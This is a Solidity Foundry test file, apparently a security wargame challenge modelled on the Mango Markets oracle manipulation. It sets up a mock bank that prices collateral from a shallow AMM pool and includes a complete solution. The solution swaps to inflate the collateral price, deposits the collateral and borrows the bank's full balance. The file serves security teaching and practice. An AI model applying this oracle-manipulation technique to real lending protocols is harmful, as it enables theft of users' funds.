// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// WARGAME CHALLENGE 1 — Oracle manipulation (maps to Mango Markets, Oct 2022)
//
// NaiveBank prices GOLD collateral at the spot reserves of a shallow GOLD/USD pool. Drain the bank's
// 100,000 USD using only your starting funds (10,000 USD + 1,000 GOLD).
//
// To play: delete everything between the SOLUTION markers in test_exploit() and write your own attack.
// Win: the bank is emptied and you walk away with far more USD than you started with.

import {Test} from "forge-std/Test.sol";
import {NaiveBank} from "../../src/ctf/VulnSystems.sol";
import {Pair} from "../../src/amm/Pair.sol";
import {MockToken} from "../../src/common/ERC20.sol";

contract Challenge1_Oracle is Test {
    MockToken usd;
    MockToken gold;
    Pair pair;
    NaiveBank bank;
    address player = makeAddr("player");

    uint256 constant START_USD = 10_000e18;
    uint256 constant START_GOLD = 1_000e18;
    uint256 constant BANK_USD = 100_000e18;

    function setUp() public {
        usd = new MockToken("USD", "USD", 18);
        gold = new MockToken("Gold", "GOLD", 18);
        pair = new Pair(address(gold), address(usd));

        // a shallow pool: 1,000 GOLD / 1,000 USD, so GOLD "costs" $1 but the price is cheap to move
        gold.mint(address(pair), 1_000e18);
        usd.mint(address(pair), 1_000e18);
        pair.mint(address(this));

        bank = new NaiveBank(usd, gold, pair);
        usd.mint(address(bank), BANK_USD);

        usd.mint(player, START_USD);
        gold.mint(player, START_GOLD);
    }

    function test_exploit() public {
        vm.startPrank(player);
        // ─────────────────────────────── SOLUTION ▼ (delete this and write your own) ───────────────────────────────
        // 1. pump GOLD's price: swap USD into the pool for GOLD
        uint256 usdIn = 9_000e18;
        usd.transfer(address(pair), usdIn);
        (uint112 r0, uint112 r1) = pair.getReserves(); // r0 = GOLD, r1 = USD
        uint256 goldOut = pair.getAmountOut(usdIn, r1, r0);
        pair.swap(goldOut, 0, player);

        // 2. GOLD now looks ~100x more valuable to the bank. Deposit it all as collateral.
        uint256 g = gold.balanceOf(player);
        gold.approve(address(bank), g);
        bank.depositCollateral(g);

        // 3. borrow everything the bank has
        uint256 value = (g * bank.goldPrice()) / 1e18;
        uint256 maxBorrow = (value * 70) / 100;
        uint256 bankBal = usd.balanceOf(address(bank));
        bank.borrow(maxBorrow < bankBal ? maxBorrow : bankBal);
        // ─────────────────────────────── SOLUTION ▲ ───────────────────────────────
        vm.stopPrank();

        assertLt(usd.balanceOf(address(bank)), 10_000e18, "the bank should be drained");
        assertGt(usd.balanceOf(player), START_USD + 50_000e18, "you should walk away with the bank's USD");
    }
}
